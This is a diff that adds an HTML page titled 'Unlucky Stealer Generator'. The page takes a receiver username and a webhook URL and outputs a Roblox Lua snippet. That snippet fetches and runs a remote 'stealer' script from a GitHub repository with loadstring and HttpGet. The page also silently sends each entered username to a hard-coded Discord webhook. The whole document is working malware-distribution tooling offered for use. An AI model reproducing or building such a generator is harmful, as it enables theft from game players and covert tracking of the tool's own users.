@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unlucky Stealer Generator - By wum_ph</title> <!-- Updated Title -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, rgba(31, 28, 44, 0.8), rgba(146, 141, 171, 0.8)), url('https://tenor.com/view/blue-fire-pyrotechnics-animation-blue-on-fire-gif-16683731');
+      background-size: cover;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: rgba(51, 51, 51, 0.9);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      max-width: 600px;
+      width: 100%;
+      text-align: center;
+      animation: fadeIn 2s ease-in-out;
+    }
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 5px;
+      color: #ffcc00;
+      animation: glow 1.5s infinite;
+    }
+    h2 {
+      font-size: 1.5em;
+      color: #ffcc00;
+      margin-bottom: 20px;
+      animation: glow 2s infinite;
+    }
+    .input-field {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: none;
+      font-size: 1em;
+      box-sizing: border-box;
+      background: #555;
+      color: #fff;
+      animation: slideIn 1.5s ease-in-out;
+    }
+    button {
+      padding: 15px 30px;
+      background-color: #ffcc00;
+      color: #333;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1.2em;
+      transition: background-color 0.3s;
+      animation: slideIn 1.5s ease-in-out;
+    }
+    button:hover {
+      background-color: #e6b800;
+      animation: bounce 0.3s ease-in-out;
+    }
+    #output {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #222;
+      border-radius: 5px;
+      text-align: left;
+      white-space: pre-wrap;
+      color: #00ffcc;
+      font-family: 'Courier New', Courier, monospace;
+      animation: fadeInUp 1.5s ease-in-out;
+    }
+    .error {
+      color: #ff4d4d;
+      margin-bottom: 10px;
+      text-align: left;
+      animation: shake 0.5s;
+    }
+    .watermark {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #888;
+      animation: fadeInUp 2s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes glow {
+      0%, 100% { text-shadow: 0 0 20px #ffcc00, 0 0 30px #ffcc00, 0 0 40px #ffcc00; }
+      50% { text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00, 0 0 30px #ffcc00; }
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(-50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes fadeInUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25%, 75% { transform: translateX(-10px); }
+      50% { transform: translateX(10px); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Unlucky Stealer Generator</h1>
+    <h2>By wum_ph</h2> <!-- New subtitle with the website name -->
+    <div class="input-field">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" placeholder="Enter the receiver's username">
+    </div>
+    <div class="input-field">
+      <label for="webhook">Webhook:</label>
+      <input type="text" id="webhook" name="webhook" placeholder="Enter the webhook URL">
+    </div>
+    <div id="error-message" class="error"></div>
+    <button onclick="generateOutput()">Generate Script</button>
+    <textarea id="output" rows="10" readonly></textarea>
+    <button onclick="copyToClipboard()">Copy to Clipboard</button>
+    <div class="watermark">By: wum_ph</div>
+  </div>
+
+  <script>
+    window.onload = function() {
+      alert("Welcome to the Unlucky Stealer Generator!");
+    };
+
+    function isValidUrl(url) {
+      var pattern = new RegExp('^(https?:\\/\\/)?'+ 
+        '((([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,6})|'+ 
+        '((\\d{1,3}\\.){3}\\d{1,3})|'+ 
+        '(\\[?[a-f0-9]*:[a-f0-9:]+\\]?)'+ 
+        ')(:\\d+)?(\\/[-a-z0-9%_.~+]*)*'+ 
+        '(\\?[;&a-z0-9%_.~+=-]*)?'+ 
+        '(#[-a-z0-9_]*)?$','i');
+      return !!pattern.test(url);
+    }
+
+    function generateOutput() {
+      var username = document.getElementById("username").value.trim();
+      var webhook = document.getElementById("webhook").value.trim();
+      var errorMessage = document.getElementById("error-message");
+
+      if (!username) {
+        errorMessage.textContent = 'Username is required.';
+        return;
+      }
+
+      if (!isValidUrl(webhook)) {
+        errorMessage.textContent = 'Invalid webhook URL format.';
+        return;
+      }
+
+      errorMessage.textContent = '';
+
+      var outputString = 'Receiver = "' + username + '"\n' +
+                         'Webhook = "' + webhook + '"\n\n' +
+                         'loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()';
+
+      document.getElementById("output").value = outputString;
+      hljs.highlightAll();
+
+      sendWebhookNotification(username);
+    }
+
+    function sendWebhookNotification(username) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://discord.com/api/webhooks/1263800250728972288/nyfnUPk4ITIwwxWRs0SIUC3DGwtps5zq18iXk3igbCS2LUTJbDCIXpYinqfCCkwoLVZw", true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      var payload = JSON.stringify({
+        content: "Usernames Receiver: " + username,
+        username: "Unlucky Stealer Generator"
+      });
+      xhr.send(payload);
+    }
+
+    function copyToClipboard() {
+      var copyText = document.getElementById("output");
+      copyText.select();
+      document.execCommand("copy");
+      alert("Copied to clipboard!");
+    }
+  </script>
+
+</body>
+</html>
